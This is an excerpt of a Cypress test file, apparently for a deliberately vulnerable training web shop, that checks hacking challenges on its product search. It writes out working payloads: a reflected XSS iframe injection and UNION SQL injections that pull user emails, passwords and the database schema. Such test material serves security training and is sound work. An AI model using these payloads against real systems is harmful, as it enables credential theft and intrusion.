...
describe('/#/search', () => {
    ...
    describe('challenge "xssBonusPayload"', () => {
        it('search query should be susceptible to reflected XSS attacks', () => {
            cy.get('#searchQuery').click();
            cy.get('#mat-input-0')
                .type('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>')
                .type('{enter}');
...
describe('/rest/products/search', () => {
    describe('challenge "unionSqlInjection"', () => {
        it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
            cy.request("/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--");
            cy.expectChallengeSolved({ challenge: 'User Credentials' });
        });
    });
    describe('challenge "dbSchema"', () => {
        it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
            cy.request("/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--");
    ...
    describe('challenge "dlpPastebinLeakChallenge"', () => {
        ...
        it('search query should logically reveal the special product', () => {
            cy.request("/rest/products/search?q='))--")
                .its('body')
                .then((sourceContent) => {
                cy.task('GetPastebinLeakProduct').then((productName) => {
    ...
    xdescribe('challenge "christmasSpecial"', () => {
        ...
        it('search query should reveal logically deleted christmas special product on SQL injection attack', () => {
            cy.request("/rest/products/search?q='))--")
                .its('body')
                .then((sourceContent) => {
                cy.task('GetChristmasProduct').then((productName) => {
                    let foundProduct = false;
                    sourceContent.data.forEach((product) => {
                        if (product.name === productName.name) {
                            foundProduct = true;
                    ...
                    sourceContent.data.forEach((product) => {
                        if (product.name === productName.name) {
                            cy.window().then(async () => {
                                const response = await fetch(`${Cypress.env('baseUrl')}/api/BasketItems/`, {
                                    method: 'POST',
                                    cache: 'no-cache',
                                    headers: {
